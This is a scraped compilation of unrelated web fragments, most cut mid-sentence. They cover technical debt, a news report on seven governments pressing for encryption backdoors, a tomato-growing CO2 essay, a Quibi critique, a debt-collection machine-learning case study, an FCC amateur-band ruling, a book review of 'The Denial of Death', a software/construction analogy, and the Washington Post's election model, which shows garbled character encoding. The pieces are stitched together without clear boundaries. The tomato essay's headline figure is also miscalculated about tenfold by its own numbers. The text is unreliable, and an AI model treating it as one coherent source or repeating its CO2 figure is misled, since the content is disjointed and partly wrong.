<p>As we can see, the first step is about finding the debt spots and, in the second step, we need to make sure that these spots are noticeable for the whole team. You can assure that by creating new tasks flagged as Technical Debt, for example. We can also choose the priorities of these tasks based on their relevance. Tools like Jira have mechanisms to increase the priority of certain tasks over time, which is amazing, because, as we have seen before, the cost of a Technical Debt increases over time.</p>
<p>After that, we need to create a plan, and really follow that plan, for the marked tasks. This way, we will effectively Act on the debts and, after the fixes and improvements being implemented, we need to Test and assure that no behaviors were damaged, be it new bugs, features, improvements, or anything that could hinder the final experience.</p>
<p>You can find more detailed information about this in a book called “Refactoring for Software Design Smells - Managing Technical Debt”.</p>
<h3>2. Pareto Principle</h3>
<p>If you don’t know how many tasks you should have for each team iteration.</p>
<p><img alt="Pareto principle demonstrated using Pizza slices" src="https://labcodes.com.br/blog/images/tech-debt/pareto-principle-en.png"></p>
<p>We can use the Pareto Principle to assign 20% of the team’s productivity to Technical Debt tasks, and the 80% that remains is used in ordinary tasks, as new features, bug fixing, and everything else.</p>
<h3>3. Technical Debt Review Reunions</h3>
<p><img alt="Cat's in a Tech Debt review" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-review.png"></p>
<p>If you have big deliveries in your process after a few iterations, it might be a good thing to have post-mortem reunions to discuss everything that’s been introduced to the code that has the potential to increase the Technical Debt.</p>
<p>By doing this, we can identify the debts earlier.</p>
<p>These are three examples of possible solutions, but I’d advise you to be extra critical and choose the one that fits you and your team the best.</p>
<p>Let’s probe the economical side of this problem. Is it lucrative to work with a system that already has a big Technical Debt cost?</p>
<h2>Is it lucrative</h2>
<p>I’m going to use a lecture by <a href="https://www.youtube.com/watch?v=TQ9rng6YFeY" target="_blank">J.B. Rainsberger</a> to illustrate my point. In this lecture, Rainsberger explains the cost of the next new feature for your software and how to diminish your error rate when estimating this cost.</p>
<p><img alt="Chart comparison of the two approaches of software coding" src="https://labcodes.com.br/blog/images/tech-debt/next-feature-cost.png"></p>
<p>In this chart, he compares two different costs over time in a project.</p>
<p>As we can see, the cost of a software built without …</p></div></div>

 <li>The US and six of its allies issued a joint statement last week calling on <keyword keytype="UnKnown" smid="0" usetype="2" keywordseo="tech" actualkeyword="tech">tech</keyword> companies to weaken <keyword keytype="Technology" smid="0" usetype="2" keywordseo="encryption" actualkeyword="encryption">encryption</keyword> and make it easier for law enforcement to access people's private messages.</li>

 <li>Barr has for years been pressuring companies like Facebook and <keyword keytype="organization" smid="0" usetype="2" keywordseo="Apple" keynameseo="apple" actualkeyword="apple">Apple</keyword> to break end-to-end encryption, but the companies have declined.</li>
</ul>
<p data-pos="4">The US and six of its allies are calling on big tech companies to weaken encryption in order to make it easier for law enforcement to break into messaging apps like iMessage or WhatsApp.</p>
<p data-pos="6">Officials from the UK, Canada, Australia, New Zealand, Japan, and India joined US Attorney General William Barr to issue an <a target="_blank" href="https://www.justice.gov/opa/pr/international-statement-end-end-encryption-and-public-safety" rel="nofollow">international statement</a> last week criticizing tech companies that currently offer end-to-end encryption.</p><p>
Barr has been pressuring tech companies to weaken encryption for years, arguing that end-to-end encryption makes it harder for law enforcement to track down criminals. The Department of Justice has called out <a target="_blank" href="https://www.nytimes.com/2019/12/10/technology/whatsapp-barr-encryption.html" rel="nofollow">Facebook</a> and <a target="_blank" href="https://www.businessinsider.com/doj-apple-crack-locked-iphones-pensacola-shooter-2020-1" rel="nofollow">Apple</a> for providing end-to-end encryption, but both companies have so far refused to weaken their security protocols.</p><p>
Services like WhatsApp, iMessage, Signal, and Zoom use end-to-end encryption, which means all messages are automatically encrypted and can only be decrypted by the unique "key" found on the devices of the sender and recipient. That means nobody — including law enforcement or even the companies that own the apps — can access the messages without obtaining a users' device and logging in.
</p><p data-pos="12">The seven governments want tech companies to find a way to build "back doors" into messaging apps that would let police easily access the messages of suspects in criminal investigations. They also argue that encryption makes it impossible for tech companies to enforce their own terms of service and prevent illegal activity on their apps.</p><p>
"Law enforcement has a responsibility to protect citizens by investigating and prosecuting crime and safeguarding the vulnerable," the countries wrote in the <a target="_blank" href="https://www.justice.gov/opa/pr/international-statement-end-end-encryption-and-public-safety" rel="nofollow">statement</a>. "End-to-end encryption that precludes lawful access to the content of communications in any circumstances directly impacts these responsibilities, creating severe risks to public safety."</p><p><span>Advertisement</span></p><hr>
<p data-pos="16">Last year, all of the same countries except Japan and India issued a similar statement calling on tech companies to create backdoors. Tech companies have consistently objected, <a target="_blank" href="https://www.businessinsider.com/doj-apple-crack-locked-iphones-pensacola-shooter-2020-1" rel="nofollow">arguing</a> that there's no way to build such backdoors without eliminating end-to-end encryption altogether.</p><p>
Security experts have echoed that sentiment. Chris Howell, CTO of encrypted messaging app Wickr, said the governments' calls would effectively imperil people's </p><keyword keytype="UnKnown" smid="0" usetype="2" keywordseo="privacy" keynameseo="Privacy" actualkeyword="Privacy">privacy</keyword><p> and make apps more vulnerable to cybercriminals in an <a target="_blank" href="https://www.businessinsider.com/doj-apple-crack-locked-iphones-pensacola-shooter-2020-1" rel="nofollow">interview</a> with Business Insider earlier this year.
"There is no security mechanism that can discriminate between a hacker trying to crack it and a law enforcement officer trying to do the same thing," Howell said. "Either we secure it or we don't, it's that simple."</p>

<p><strong>tl;dr If every person on the planet grows 10 tomato plants a year, we could offset Germany’s annual CO2 emissions.</strong></p>

<p>I think everyone should grow some plants. If you have a (backyard) garden, a balcony, or just a windowsill, you should grow something. There are a lot of direct and indirect benefits from doing that. I will focus on some of these.</p>

<h2 id="to-help-regenerate-the-environment">To help regenerate the environment</h2>

<p>I think this the most obvious and should be enough to start growing whatever you like immediately. One tomato plant fixates 1.5kg of CO2 per year on average[1]. If every person on the planet grows 10 plants a year (~ 7.594.000.000 people), we could sequester ~1.1 billion tons of CO2. This is more than the annual CO2 emissions of Germany.[2] Sure this is a simple calculation, and it is not accounting for CO2 spend on the work and materials you need to grow that plant, but you get the idea of how powerful your backyard plot can be. Also don’t forget the billions of tomatoes this will produce and they would not need to be produced and delivered through highly emission inefficient food systems. If you really care about this reason, then there are plants for even better sequestration of CO2 than a tomato[3].</p>

<h2 id="to-lower-your-expenses">To lower your expenses</h2>

<p>Don’t worry. I am not talking about money here. Sure, many people have enough space to grow enough food to sell it at some scale, and you can try it with your 10 tomato plants from above, but you can lower your expenses by growing your own plants in many different ways. One obvious way is to consume your own produce. Suppose you use it for food, medicine, or raw materials like wood and fiber. If you can grow some things by yourself, you need to buy less.
Another way is to use it to swap your produce with friends, family, and neighbors with other products you are not producing by yourself.</p>

<h2 id="to-reconnect-to-nature">To (re)connect to nature</h2>

<p>Growing a plant is a magical experience. You will see the magic of life and how much patience you need for this to happen. Seeing the first little green spikes pushing out of the soil will make you happier than the last binge-watching session you had. And imagine all that excitement and waiting for the first ripe tomato for you to harvest. It will feel like being five again waiting for Christmas. And then you eat the fruit that you grew by yourself, and you taste pure success. If you need a visual to that feeling, watch the scene of Castaway with Tom Hanks when he managed to make fire. Just do it without the fire, please, or you will kill your happily grown CO2 offset.</p>

<p>Happy growing 🌱✌️,</p>

<p>Ben</p>

Shows from big-name creators and actors didn't help either. </p><p>It all felt like some huge media company trying to shove its product down our throat. A lot like a notable failure they seemingly never heard about, go90.</p><p>Rather than take the approach of a startup to validate their idea they went full steam ahead assuming they knew exactly what people wanted.</p><h2 id="why-even-exist">Why Even Exist?</h2><p>If you're going to create a new product you better be able to convince people there's a reason it should exist. Most products solve some problem. Maybe a problem people weren't fully aware of before. Quibi never seemed clear on what it was solving.</p><p>Looking for shortform content? There's Youtube &amp; TikTok. Content on the go? Youtube, TikTok, Instagram. Content while at home? Netflix, Disney+, etc. Why would anyone pay for Quibi with all these free alternatives available?</p><h2 id="poor-tech">Poor Tech</h2><p>This is probably the most inexcusable aspect of it all. You raise all that money, hire a bunch of people, and still don't at least have a great app. Not being able to share clips. No TV support. Not even screenshot support. How did anyone miss those? Creating good content is difficult and failing at it can be excused. Netflix took years to reliably create good content. But failing at the basic aspects of your product is embarrassing.</p><h2 id="schadenfreude">Schadenfreude</h2><p>All these decisions (<a href="https://www.theverge.com/2020/10/22/21528404/quibi-shut-down-cost-subscribers-content-tv-movies-katzenberg-whitman-tiktok-netflix">and a bunch more</a>) put together painted Quibi as a company run by arrogant execs who thought their experience meant they knew better than their audience. And that advertising alone would be enough to create a successful product. </p><p>Seeing so much money wasted made laughing at their downfall easy. The internet values authenticity and will always ridicule hubris. Quibi's money couldn't make it go viral but their execs terrible decisions have done it with ease.</p>

                        <p>This is part-5 of the case study on Boost Debt Collections and Recoveries using Machine Learning (MLBR). A machine learning predictive model to enhance the current recovery system by creating focus groups for business to boost debt collection.</p><blockquote><em><em><em><em><u>Disclaimer:</u> This case study is solely an educational exercise and information contained in this case study is to be used only as a case study example for teaching purposes. This hypothetical case study is provided for illustrative purposes only and do not represent an actual client or an actual client’s experience. All of the data, contents and information presented here have been altered and edited to protect the confidentiality and privacy of the company.</em></em></em></em></blockquote><p>In <a href="https://thinkml.ai/boost-collections-and-recoveries-using-machine-learning-p1/">Part-1</a>, we looked at the background and the understanding of the debt collection and recovery process in credit lending companies. We looked at the entities/players involved in the traditional debt recovery process. We also defined the objective of our use case and highlights of the proposed machine learning solution.</p><p>In <a href="https://thinkml.ai/boost-collections-and-recoveries-using-machine-learning-p2/">Part-2</a>, we looked at the data elements and high level design. We also discussed the data collection process and design of the data pipeline. We also discussed the complex data variables created as result of feature engineering. We also discussed the importance of expert opinion in this complex case study. The value of expert opinion and how collection score turned out to be a significant key attribute in Modeling phase.</p><p>In <a href="https://thinkml.ai/boost-collections-and-recoveries-using-machine-learning-p3/">Part-3</a>, we discussed the modeling phase. We also explained the learning phase and the various data sets. How Training data set, Test data set and cross validation data set are prepared.</p><p>In <a href="https://thinkml.ai/boost-collections-and-recoveries-using-machine-learning-p4/">Part-</a>4, we reviewed the training results of the various models including Support Vector Machine (SVM), Naïve Bayes (NB) and Decision Tree (DT). </p><p>In this part, we will look at the Cross Validation Result and Implementation.</p><h3 id="4-7-testing-and-cross-validation">4.7. &nbsp; Testing and Cross Validation</h3><p>The basic idea of Cross Validation is to test the model using historical snapshot. A particular point in history is taken as a reference. The data prior to that point is fed to the model. Model predict the recovery for that historical point. These predictions are then compared against real data. Illustrated below is the cross validation approach adopted.</p><figure><img src="https://thinkml.ai/content/images/2020/10/image.png" alt=""><figcaption>Cross Validation Approach</figcaption></figure><p>Two tests were performed using two different unseen snapshots. One for Mar 2018 and another for Mar 2019.</p><h3 id="1-cross-validation-1-cv1-">1) &nbsp;Cross Validation-1 (CV1)</h3><p>It is the first test performed and snapshot-1 is used. The idea of this test was to run models on a historical snapshot (snapshot-1) and then compare the results with a 7 months later snapshot as illustrated in figure 9. The objective of this cross validation is to validate the model predictions with actual results available in Snaphot 2.</p><h3 id="2-cross-validation-2-cv2-">2) &nbsp;Cross Validation-2 (CV2)</h3><p>This is second test which is exactly similar to first test (CV1). The only difference here is that we executed models on much older snapshot (fig. 9: “testing” dataset from snapshot-0 ). The results are then compared with snapshot-2 (same as in CV1). Note that the time difference between both snapshots here is almost 1.5 years. The larger time window between both snapshots will give us more confidence on the accuracy of the model.</p><h3 id="4-7-1-results-and-cross-validation">4.7.1. &nbsp;Results and Cross Validation</h3><p>Results are reviewed and evaluated for both CV1 and CV2 cross validations.</p><h3 id="a-cross-validation-1-results-cv1-">A) &nbsp;Cross Validation-1 Results (CV1)</h3><p>For this round of testing, currently we have fed only the clients with write off amount over $1000, that’s why the last row is empty. We will update this table with those remaining clients as well. The inferences from the below results are,</p><ol><li><strong>73%</strong> of “High probable” worked customers have returned some/full amount.</li><li><strong>23% </strong>of “Medium probable” worked customers have returned some/full amount.</li><li><strong>None</strong> of the Low and Zero probable customers have paid any money so far but they may do in future.</li></ol><p>Based on the above inference, we can say that Recoveries can be improved if</p><ol><li>We work 100% of the clients in “High” and “Medium”.</li><li>We reduce the effort spent on “Low” customers. Probably may focus on clients high balance amount in write off.</li><li>We do not work on “Zero” base. It is better to sell this debt to external debt collectors, as the recovery rate is less than 1%.</li></ol><figure><img src="https://thinkml.ai/content/images/2020/10/image-1.png" alt=""><figcaption>Cross Validation-1</figcaption></figure><p>We further identified the monetary benefit of working based on this model results. If our agents work on all the cases in “High” and “Medium” probable clients based, our recovery would increase by 11%.</p><h3 id="b-cross-validation-2-results-cv2-">B) &nbsp;Cross Validation-2 Results (CV2)</h3><p>The results of the Mar 2018 prediction are given below. Few inferences as per this results are,</p><ol><li>Out of all customers in “High probability” Category, agents have worked on 60% and were able to collect from 75% with <strong>recovery rate of 63%.</strong></li><li>Out of all “Medium probability” customers, they have worked only on 27%. We should work on these remaining cases.</li><li>Out of all worked customers in “Low” bucket, the return was 6% returns, which may be a wasted effort. This effort should have been spent on High and Medium.</li></ol><figure><img src="https://thinkml.ai/content/images/2020/10/image-2.png" alt=""><figcaption>Cross Validation-2</figcaption></figure><p>The monetary gain we would have made by working on all of the High and Medium clients. The inferences are,</p><ol><li>The recovery rate from “High” customers is 49%. This considers only the clients we have contacted. The uncontacted clients in the High Category as 60%. Assuming we get the same 49% recovery from these customers, we would be able to recover at least 25% more.</li><li>Same with Medium category as well. By working remaining unworked clients, we would be able to increase our recovery by $13% as shown in green at the last row.</li><li>If the above numbers turns true in real world, then we would realize a high net increase in our recoveries.</li></ol><p>That's all about this case study. Hope this series of post on Boost Debt Collection and Recovery using Machine Learning have been valuable to those who are intrigued.</p><p><em><strong>Tools and Technologies Used:</strong></em></p><ol><li>Oracle Advanced Analytics for machine learning.</li><li>R programming language.</li><li>OBIEE for dashboard and reports development.</li></ol><p>Cheers :)</p>

<p>Say goodbye to another amateur radio band. The Federal Communication Commission (FCC) has ruled that it will revoke amateur radio privileges on the 3300-3500 MHz (9-cm Microwave band). The FCC will auction the band to wireless telecom companies to support 5G rollouts across the United States. The dates when amateur radio privileges will “sunset” have yet to be approved. Ham radio operators should expect this to occur sometime in 2021.&nbsp;</p>



<blockquote><p>“We adopt our proposal from the&nbsp;<em>Notice of Proposed Rulemaking</em>&nbsp;to remove the amateur allocation from the 3.3 – 3.5 GHz band,” the FCC said in its&nbsp;<em>Report and Order</em>&nbsp;(<a target="_blank" href="https://ecfsapi.fcc.gov/file/1002214202488/FCC-20-138A1.pdf" rel="noreferrer noopener"><strong><em>R&amp;O</em></strong></a>) and&nbsp;<em>Further Notice of Proposed Rulemaking&nbsp;</em>in WT Docket No. 19-348, adopted on September 30 and&nbsp;<a target="_blank" href="https://www.federalregister.gov/public-inspection/2020-22528/facilitating-shared-use-in-the-3100-3550-mhz-band" rel="noreferrer noopener"><strong>published</strong></a>&nbsp;October 9 in&nbsp;<em>The Federal Register</em>,&nbsp;<em>R&amp;O</em>. “[W]e adopt changes to our rules today that provide for the sunset of the secondary amateur allocation in the band, but allow continued use of the band for amateur operations, pending resolution of the issues raised in the&nbsp;<em>Further Notice</em>.”</p><cite>– Federal Communication Commission  </cite></blockquote>



<p>Many ham radio operators likely haven’t used the 9-centimeter band, but that doesn’t mean it’s dead. Operators are doing moonbounce operations, and other microwave experimenters are active on the band. The most exciting use could be the <a href="https://www.arednmesh.org/">Amateur Radio Emergency Data Network (AREDN)</a> project. The 9-centimeter band provides 24 channels on 3.5 GHz that are not currently shared with Part 15 users.&nbsp;AREDN mesh networks have proven to be useful in emergency situations. </p>







<p>We should all be asking the real question. Why is this happening? Look no further than the <a href="https://www.congress.gov/bill/115th-congress/senate-bill/19">MOBILE NOW Act</a>. The MOBILE NOW Act was introduced by Sen. John Thune (R-S.D.) in 2017 and signed by President Donald Trump in 2018. The legislation directs the FCC to make additional spectrum available to auction for mobile and fixed wireless broadband to support 5G development.&nbsp;</p>



<h2>Following the telecom money</h2>



<p>It’s not a secret that 5G will require a lot of spectrum. LTE channel bandwidth maxes out at 20 MHz per-channel. 5G channel bandwidth can be as wide as 100 MHz. No, that’s not a typo.&nbsp;</p>



<p>Wireless carriers have been <a href="https://venturebeat.com/2020/03/12/fccs-largest-spectrum-auction-nets-4-47-billion-for-5g-mmwave-bands/">snapping up spectrum in recent years</a> to prepare for 5G rollouts, making billions for the U.S. government in the process. Whoever has the most spectrum will have the most robust 5G network — plain and simple.&nbsp;</p>



<p>The Verizon and AT&amp;Ts of the world would love nothing more than to get their hands on spectrum that’s currently used by the Federal government (or amateur radio). That’s what the MOBILE NOW Act was all about— getting the Federal Government to sell more of the RF spectrum to private telecoms.</p>



<p>Remember Sen. John Thune, the legislator who first introduced the bill? Take a guess who his biggest financial donors are?</p>



<div><figure><img loading="lazy" src="http://k0lwc.com/wp-content/uploads/2020/10/John_Thune_Donors.jpg" alt="" width="620" height="456" srcset="http://k0lwc.com/wp-content/uploads/2020/10/John_Thune_Donors.jpg 709w, http://k0lwc.com/wp-content/uploads/2020/10/John_Thune_Donors-300x221.jpg 300w" sizes="(max-width: 620px) 100vw, 620px"><figcaption><em>Sen. John Thune financial donors 2015-2020. (OpenSecrets)</em></figcaption></figure></div>



<p>All of the companies highlighted in green have a stake in the development of 5G. Of course, Sen. Thune will introduce legislation as they’ve lobbied him to do. Whoever has the most money has the loudest voice in Congress. </p>



<h2>The threat to ham radio</h2>



<p>Private telecom companies pushing to purchase spectrum is the <em>greatest threat</em> to ham radio. It’s not FT8, DMR/YSF/D-Star or any other digital mode that hams grumble about.  More than ever we need effective representation in Washington D.C. advocating for the value that amateur radio provides to the <s>country </s> world. </p>



<p>However, the <a href="http://www.arrl.org/">American Radio Relay League (ARRL)</a> is actually doing less than ever before, only focusing on the <a href="https://www.congress.gov/bill/116th-congress/house-bill/466">Ham Radio Parity Act</a> which protects ham radio operators from HOAs. The bill remains stuck in committee.  </p>



<h4>Amateur Radio Relay League Lobbying Efforts</h4>

<h2>How can we fight back?</h2>



<p>I don’t have any good answers or ideas. The only thing I know for sure is we need better organization and representation. Oh, and that money thing might help. </p>



<p>Leave your ideas on how we can fight to preserve our ham radio bands below and <strong>share this article</strong> to help spread awareness in the ham radio community!</p>

I couldn’t stop taking notes and shuffling my many thoughts that kept rising during these intense moments. </p><p>Here the definite highlights are the exploration of neuroticism and transference. This is why I eventually ended up with a significantly higher opinion of this book, although it is one of the toughest reads I've ever had. The writing here is heavily grounded in theoretical psychoanalysis, which might turn a lot of people off, but if you manage to plow through it all there are lots of gems to be found. </p><p>Here you get to dive into such great minds like Otto Rank, Sigmund Freud, Søren Kierkegaard and many others. If you've ever read the biography or learned about Steve Jobs (the founder of Apple), you might have started disliking him as you got to know his actual personality. Here I got a similarly bad taste of Sigmund Freud, as I didn't study him before. His thinking and obsessive over-sexualization feel ridiculous. What also left a bad taste from the book overall was an unusually heavy focus on the male gender while a female perspective was secondary or often completely sidelined. </p><p>Overall, this was a true revolution for my understanding of psychology, belief systems, religion and some aspects of life and death in general. If you get the book, get ready for an incredible ride. Below you can study some of the highlights that I made myself while reading it. </p><h2 id="content">Content</h2><ul><li>Introduction</li><li>Society as a mythical hero system</li><li>Animal versus a conscious man</li><li>Freedom and anxiety</li><li>Transference and its effect on group psychology</li><li>Relationships</li><li>Narcissism</li><li>Neurosis</li><li>Fall of religion and rise of psychology</li><li>Death</li></ul><h2 id="introduction">Introduction</h2><p>The following three strands give an overview of the book. As in the foreword by Sam Keen and Daniel Goleman:</p><p><strong>First strand (the world): </strong>"The world is terrifying. To say the least, Becker’s account of nature has little in common with Walt Disney. Mother Nature is a brutal bitch, red in tooth and claw, who destroys what she creates. We live, he says, in a creation in which the routine activity for organisms is “tearing others apart with teeth of all types—biting, grinding flesh, plant stalks, bones between molars, pushing the pulp greedily down the gullet with delight, incorporating its essence into one’s own organization, and then excreting with foul stench and gasses the residue.”</p><p><strong>Second strand (controlling our anxiety): </strong>"The basic motivation for human behavior is our biological need to control our basic anxiety, to deny the terror of death. Human beings are naturally anxious because we are ultimately helpless and abandoned in a world where we are fated to die. “This is the terror: to have emerged from nothing, to have a name, consciousness of self, deep inner feelings, an excruciating inner yearning for life and self-expression—and with all this yet to die."</p><p><strong>Third strand (defence mechanisms and repression):</strong> "Since the terror of death is so overwhelming we conspire to keep it unconscious. “The vital lie of character” is the first line of defense that protects us from the painful awareness of our helplessness. Every child borrows power from adults and creates a personality by introjecting the qualities of the godlike being. If I am like my all-powerful father I will not die. So long as we stay obediently within the defense mechanisms of our personality, what Wilhelm Reich called “character armor” we feel safe and are able to pretend that the world is manageable. But the price we pay is high. We repress our bodies to purchase a soul that time cannot destroy; we sacrifice pleasure to buy immortality; we encapsulate ourselves to avoid death. And life escapes us while we huddle within the defended fortress of character."</p><h2 id="society-and-culture-as-a-mythical-hero-system">Society and culture as a mythical hero system</h2><p>"This is what society is and always has been: a symbolic action system, a structure of statuses and roles, customs and rules for behavior, designed to serve as a vehicle for earthly heroism. Each script is somewhat unique, each culture has a different hero system. What the anthropologists call “cultural relativity” is thus really the relativity of hero-systems the world over."</p><p>"It doesn’t matter whether the cultural hero-system is frankly magical, religious, and primitive or secular, scientific, and civilized. It is still a mythical hero-system in which people serve in order to earn a feeling of primary value, of cosmic specialness, of ultimate usefulness to creation, of unshakable meaning. They earn this feeling by carving out a place in nature, by building an edifice that reflects human value: a temple, a cathedral, a totem pole, a sky-scraper, a family that spans three generations. The hope and belief is that the things that man creates in society are of lasting worth and meaning, that they outlive or outshine death and decay, that man and his products count. When Norman O. Brown said that Western society since Newton, no matter how scientific or secular it claims to be, is still as “religious” as any other, this is what he meant: “civilized” society is a hopeful belief and protest that science, money and goods make man count for more than any other animal. In this sense everything that man does is religious and heroic, and yet in danger of being fictitious and fallible."</p><p>"The minority groups in present-day industrial society who shout for freedom and human dignity are really clumsily asking that they be given a sense of primary heroism of which they have been cheated historically. This is why their insistent claims are so troublesome and upsetting: how do we do such an “unreasonable” thing within the ways in which society is now set up? “They are asking for the impossible” is the way we usually put our bafflement."</p><p>"Everything painful and sobering in what psychoanalytic genius and religious genius have discovered about man revolves around the terror of admitting what one is doing to earn his self-esteem. <strong>This is why human heroics is a blind drivenness that burns people up; in passionate people, a screaming for glory as uncritical and reflexive as the howling of a dog.</strong> In the more passive masses of mediocre men it is disguised as they humbly and complainingly follow out the roles that society provides for their heroics and try to earn their promotions within the system: wearing the standard uniforms—but allowing themselves to stick out, but ever so little and so safely, with a little ribbon or a red boutonniere, but not with head and shoulders."</p><p>"If we were to peel away this massive disguise, the blocks of repression over human techniques for earning glory, we would arrive at the potentially most liberating question of all, the main problem of human life: <strong>How empirically true is the cultural hero system that sustains and drives men?</strong>"</p><p>"To lose the security of heroic cultural illusion is to die—that is what “deculturation” of primitives means and what it does. It kills them or reduces them to the animal level of chronic fighting and fornication. Life becomes possible only in a continual alcoholic stupor. Many of the older American Indians were relieved when the Big Chiefs in Ottawa and Washington took control and prevented them from warring and feuding. It was a relief from the constant anxiety of death for their loved ones, if not for themselves. But they also knew, with a heavy heart, that this eclipse of their traditional hero-systems at the same time left them as good as dead."</p><p>"Man will lay down his life for his country, his society, his family. He will choose to throw himself on a grenade to save his comrades; he is capable of the highest generosity and self-sacrifice. <strong>But he has to feel and believe that what he is doing is truly heroic, timeless, and supremely meaningful. The crisis of modern society is precisely that the youth no longer feel heroic in the plan for action that their culture has set up.</strong> They don’t believe it is empirically true to the problems of their lives and times."</p><p>"When we are young we are often puzzled by the fact that each person we admire seems to have a different version of what life ought to be, what a good man is, how to live, and so on. If we are especially sensitive it seems more than puzzling, it is disheartening. What most people usually do is to follow one person’s ideas and then another’s, depending on who looms largest on one’s horizon at the time. The one with the deepest voice, the strongest appearance, the most authority and success, is usually the one who gets our momentary allegiance; and we try to pattern our ideals after him. But as life goes on we get a perspective on this, and all these different versions of truth become a little pathetic. Each person thinks that he has the formula for triumphing over life’s limitations and knows with authority what it means to be a man, and he usually tries to win a following for his particular patent.

<p>Analogies are always useful to get into the right mindset about how things work. They are even more useful if you’re trying to explain how software engineering works to a non-technical person. </p>



<figure><img src="https://pmtips.net/Portals/0/EasyDNNnews/2285/img-construction-health-safety-environmental-audits.jpg" alt="construction"></figure>



<p>People tend to think that building software involves some kind of black magic.  In reality, this process is a lot more methodical and deterministic but is difficult to explain exactly what we do to any outsider. </p>



<p>It’s really hard to get an accurate analogy because it’s not as deterministic as some manufacturing process like crafting chairs but it’s also not as open-ended as writing a book or painting. </p>



<p>We also tend to think our job is mostly about coding and doing some other technical stuff, but the truth is that the software development process is more about the successful interactions between clients, management and software engineers than any other thing.</p>



<p>One useful analogy that could work is civil engineering. Is simple enough that anyone can understand it but is technically consistent to make it accurate.</p>



<h3>Key Similarities</h3>



<ul><li><strong>You cannot estimate the real effort of a project without doing some work first.</strong> You cannot expect to go to an engineering firm and simply ask “How much will it cost to build a bridge like the Golden Gate?”. <br>If you’re an experienced engineer you probably do some rough estimate using the original cost of the bridge, some similar ongoing project, and some other variables but you know that these kinds of estimates are impossible to do. <br>Anyway, folks go lightly asking “How much an app like uber will cost to do?” and most of us want to bang our heads to the wall trying to explain that this is not how it works.</li><li><strong>Most estimates are bullshit and you’ll probably need a lot more time and money to build that.</strong> This is known in software. Many like to pretend estimates are written on stone but we know that they are at best an educated guess. In the construction business, this is also a thing, but they usually don’t pretend that they know what they are estimating. <br>For example, the<a href="https://coffey.com/en/ingenuity-coffey/poor-project-cost-estimates-are-more-than-embarrassing/"> Berlin Airport was estimated to cost </a><a rel="noreferrer noopener" href="https://coffey.com/en/ingenuity-coffey/poor-project-cost-estimates-are-more-than-embarrassing/" target="_blank">€2 billion</a> in 2006 and was expected to be finished in 2012. This airport is still not finished and it’s expected to open on 31 October 2020 and it will cost at least €6.5 billion to complete.</li><li><strong>Changing things in the middle of the project will cost a shit-ton of money and time. </strong>This is another fact most non-technical managers, product owners, and regular folks like to pretend it doesn’t exist. This is why when you’re building your home you don’t suddenly add an extra floor after 70% of the project is already done. But like I was saying, in the software industry we like to pretend is not a big deal and completely normal to add or remove 50% of the original requirements after we were working on the project for 10 months. </li></ul>



<h3>Some Limitations</h3>



<p>Like any abstraction, they are accurate to a certain degree, and there some big differences we’ll need to take into account.</p>



<ul><li><strong>Stability of the requirements.</strong> As we saw changing the requirements in the middle of the construction is sometimes prohibitively expensive and some other times borderline impossible. That’s why you wouldn’t turn a house into a sky-crapper halfway down the project. That’s a common practice in software development.</li><li><strong>Stability of prices and scale.</strong> Construction has some major advantages over software development. Most construction materials have stable and known prices and can be bought in bulk even with leasing plans. The scale of the project is also known beforehand, so you can more or less get an accurate estimate of workers and machines you’ll need.</li><li><strong>Documentation. </strong>Even to build a little project like a house requires a hell-lot of documentation and calculations, you’ll need at least 3 different architectural plans. In most software projects documentation is non-existent or completely obsolete because it was never updated after the beginning of the coding phase.</li></ul>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><p><a href="https://s3.us-east-1.amazonaws.com/elex-models-prod/2020-general/write-up/election_model_writeup.pdf" target="_blank">Read the technical writeup</a> | <a href="https://github.com/washingtonpost/2020-election-night-model" target="_blank">See the code and a sample data</a></p><p>Since November 2019, The Washington Post has constructed several different models for the purpose of estimating the number of outstanding votes in an election.</p><p><a href="https://washpost.engineering/2019/11/01/how-the-washington-post-estimates-turnout-on-election-nights/" target="_blank">Our first model was built to estimate turnout</a> in the Virginia state house and state senate elections in 2019. This model allowed us to stop using the old â€œprecincts reportingâ€� measurement and instead show a â€œpercentage of final vote recorded.â€�</p><p><a href="https://washpost.engineering/2020/02/29/how-the-washington-post-estimates-outstanding-votes-during-primaries/" target="_blank">Our second model was built to estimate turnout and vote share</a> in the Democratic primaries in 2020. This model was built to track the flow in vote share for Democratic candidates between 2016 and 2020. Helpfully, there were only two Democratic candidates in 2016, so this made the process simpler. Additionally, this approach yielded a wonderful descriptive tool which showed the estimated vote flows between candidates, so we could help answer questions like, â€œ<a href="https://washpost.engineering/2020/04/09/how-the-washington-post-generates-vote-flow-diagrams/" target="_blank">Which 2020 candidates are 2016 Clinton voters supporting?</a>â€�</p><p>Today, weâ€™re introducing our third model. In collaboration with our friends at Decision Desk HQ/0ptimus Analytics, weâ€™ve built a model to estimate turnout and vote share for the 2020 Presidential and Senate elections. And while weâ€™ll summarize the high points here, you should read our technical writeup and dive into the code yourself.</p><p>Our new method no longer estimates the covariance between geographic units like our Virginia model did. Instead, we model the quantities we are interested in directly. We do that by estimating the normalized â€œresidualâ€� or error between our pre-night prediction â€” spoiler: the 2016 turnout â€” and what we think turnout will be this year. We use demographic features such as age, gender, ethnicity, income and education as covariates, which means we implicitly leverage the night-of, observed covariances for estimation.</p><p>Estimating the normalized residual instead of turnout directly makes our model less sensitive to population differences in counties. It also makes our model less reactive to the fact that the order of reported counties is not random. In normal elections, rural counties tend to report earlier than urban counties. And because of time zones, states that are further east report results sooner than states that are further west. This year, the order of reported results will be especially bizarre because many states might not report votes totals on election night because of increased vote-by-mail. All those things together mean that we <i>know</i> that the order of counties reporting isnâ€™t a random ordering. But using the normalized residuals as our response variable makes them seem closer to random.</p><p>The predictive core of our model is a quantile regression. The difference between quantile regression and the regression youâ€™re used to seeing, ordinary least squares, is that quantile regression predicts the conditional median instead of the conditional mean. This is yet another technique which makes our prediction less sensitive to outliers. There will invariably be some counties where our covariates arenâ€™t satisfactory for predicting turnout â€” some unmodeled event like a scandal, or that one of the candidates runs a particularly good campaign. Using the median over the mean makes sure that we donâ€™t adjust our parameters too much because of those few outliers, especially early on.</p><p>Another benefit of using quantile regression is that we can estimate other quantiles which are not the median. We can estimate the 0.05th and 0.95th â€” for example â€” quantiles, which gives us a first estimate for our prediction intervals. Critically, this means that we did not make any distributional assumptions to get these prediction intervals. This is a big change from our Virginia model where we assumed turnout to be jointly normal!</p><p>Unfortunately, these prediction intervals arenâ€™t guaranteed to be correct because our model may not be specified properly or because the counties that have delivered early results are particularly unrepresentative. To solve this problem, we use a method called conformal prediction. A modern statistical method that adjusts the prediction intervals generated by quantile regression to make them 